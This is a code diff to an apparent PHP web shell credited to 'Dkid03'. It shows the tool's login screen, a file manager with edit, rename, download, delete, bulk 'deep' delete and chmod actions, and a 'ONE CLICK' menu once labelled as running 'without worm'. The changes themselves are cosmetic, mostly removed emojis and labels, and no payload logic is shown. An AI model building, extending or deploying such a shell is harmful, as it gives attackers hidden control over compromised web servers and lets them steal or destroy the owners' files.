@@ -1,5 +1,5 @@
 <?php
-//==========Maker: Dkid03
+//=========Maker: Dkid03
 //PLSS DON'T CHANGE AUTHOR 
 // ==================== LOGOUT HANDLER ====================
 if (isset($_GET['logout'])) {
@@ -2662,7 +2662,7 @@ if (isset($_SESSION['loggedin'])) {
     <?php if (!isset($_SESSION['loggedin'])): ?>
         <div class="login-container">
             <div class="login-box">
-                <h1 class="login-title">💀 Dkid03</h1>
+                <h1 class="login-title">Dkid03</h1>
                 <?php if (!empty($loginError)): ?>
                     <div class="alert alert-danger"><?= htmlspecialchars($loginError) ?></div>
                 <?php endif; ?>
@@ -2716,7 +2716,7 @@ if (isset($_SESSION['loggedin'])) {
                     <div class="menu-section">
                         <div class="menu-title">💀 ONE CLICK</div>
                         <div class="menu-item" onclick="runOneClickNoWorm()" style="color:#ff8800;">
-                            <i class="fas fa-rocket"></i> ONE CLICK (Tanpa Worm)
+                            <i class="fas fa-rocket"></i> ONE CLICK
                         </div>
                     </div>
                     <div class="menu-section">
@@ -2834,8 +2834,8 @@ if (isset($_SESSION['loggedin'])) {
                                                     <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')"> Edit</a>
                                                 <?php endif; ?>
                                                 <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')"> Rename</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">DL</a>
-                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);"> Del</a>
+                                                <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>"> DL</a>
+                                                <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" onclick="return confirm('Yakin?')" style="color:var(--danger);">🗑️ Del</a>
                                                 <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')"> CHMOD</a>
                                             </td>
                                         </tr>
@@ -2903,7 +2903,7 @@ if (isset($_SESSION['loggedin'])) {
                             <label><input type="radio" name="delete_mode" value="shallow"> Shallow</label>
                             <label><input type="radio" name="delete_mode" value="deep"> Deep</label>
                         </div>
-                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">🗑️ Delete</button>
+                        <button type="submit" name="delete_bulk" class="btn btn-block btn-danger" onclick="return confirm('⚠️ Yakin ingin menghapus file-file ini?')">Delete</button>
                     </form>
                 </div>
             </div>
@@ -2911,12 +2911,12 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="renameModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">✏️ Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title"> Rename</h2><button class="modal-close" onclick="hideModal('renameModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><input type="text" id="newName" name="new_name" class="form-control" required></div>
                         <input type="hidden" id="renameTarget" name="target"><input type="hidden" name="rename" value="1">
-                        <button type="submit" class="btn btn-block">✅ Rename</button>
+                        <button type="submit" class="btn btn-block">Rename</button>
                     </form>
                 </div>
             </div>
@@ -2924,7 +2924,7 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="editModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">✏️ Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title"> Edit</h2><button class="modal-close" onclick="hideModal('editModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><textarea id="fileContent" name="content" class="form-control" style="min-height:200px;font-family:monospace;"></textarea></div>
@@ -2937,7 +2937,7 @@ if (isset($_SESSION['loggedin'])) {
 
         <div id="chmodModal" class="modal">
             <div class="modal-content">
-                <div class="modal-header"><h2 class="modal-title">🔒 CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
+                <div class="modal-header"><h2 class="modal-title">CHMOD</h2><button class="modal-close" onclick="hideModal('chmodModal')">&times;</button></div>
                 <div class="modal-body">
                     <form method="post" action="?path=<?= urlencode($currentPath) ?>">
                         <div class="form-group"><input type="text" id="permission" name="mode" class="form-control" placeholder="0644" required></div>
